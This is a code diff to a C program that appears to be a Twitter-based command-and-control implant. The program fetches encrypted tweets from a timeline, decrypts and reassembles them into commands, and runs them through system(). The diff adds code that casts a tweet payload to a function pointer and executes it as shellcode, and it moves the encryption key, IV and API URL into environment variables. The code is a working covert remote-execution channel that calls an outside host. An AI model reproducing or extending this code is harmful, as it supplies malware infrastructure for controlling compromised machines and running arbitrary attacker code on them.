@@ -26,9 +26,9 @@
  * (/) Divide commands longer than 140 chars over multiple tweets
  * (/) Re-assemble commands longer than 140 chars from multiple tweets
  * (/) Execute reassembled command using system
+ * (/) Setup test account to try with
  *
  * @TODO:
- * (*) Setup test account to try with
  * (*) Auto tweet to account divided messages
  * (*) Additional prefix pivot for system commands vs shellcode
  * (*) Add code path to ast as function pointer and execute
@@ -60,8 +60,6 @@
 #define TWEET_LENGTH 141
 #define MAX_TWEET_LENGTH 80
 #define DATAFILE "tweetdata.json"
-#define KEY "01234567890123456789012345678901"
-#define IV "01234567890123456"
 #define CMDPREFIX "CC|"
 #define SHELLPREFIX "SC|"
 
@@ -115,11 +113,10 @@ void TwitterConnect(AppMode_t m)
     const char *csecret = getenv("CSECRET");
     const char *atok = getenv("ATOK");
     const char *atoksecret = getenv("ATOKSECRET");
+    const char *url = getenv("TAPIURL");
 
     curl_global_init(CURL_GLOBAL_ALL);
     CURL *curl = curl_easy_init();
-
-    const char *url = "https://api.twitter.com/1.1/statuses/user_timeline.json?user_id=blischalk&count=10";
 
     // URL, POST parameters (not used in this example), OAuth signing method, HTTP method, keys
     char *signedurl = oauth_sign_url2(url, NULL, OA_HMAC, "GET", ckey, csecret, atok, atoksecret);
@@ -215,10 +212,10 @@ int DecryptTweet(unsigned char decryptedresult[], char * tweet)
     unsigned char decryptedtext[10000];
 
     ///* A 256 bit key */
-    unsigned char *key = (unsigned char *)KEY;
+    unsigned char *key = (unsigned char *)getenv("ENCKEY");
 
     ///* A 128 bit IV */
-    unsigned char *iv = (unsigned char *)IV;
+    unsigned char *iv = (unsigned char *)getenv("ENCIV");
 
     ///* Initialise the library */
     ERR_load_crypto_strings();
@@ -310,6 +307,9 @@ void ExecuteTweet(int tweet_index, char * cmd)
         else if (strcmp(found_prefix, SHELLPREFIX) == 0)
         {
             printf("Executing shellcode: %s\n\n", payload);
+            int (*ret)() = (int(*)())payload;
+            ret();
+
         }
         else
         {
@@ -423,7 +423,7 @@ void EncodeTweets(char dest[][TWEET_LENGTH], char src[][TWEET_LENGTH], int tweet
     char * encryptEncode;
     for(i=0; i<tweetCount; i++)
     {
-        length = Encode(&encryptEncode, src[i], (unsigned char *)KEY, (unsigned char *)IV);
+        length = Encode(&encryptEncode, src[i], (unsigned char *)getenv("ENCKEY"), (unsigned char *)getenv("ENCIV"));
         strncpy(dest[i], encryptEncode, length);
     }
 }
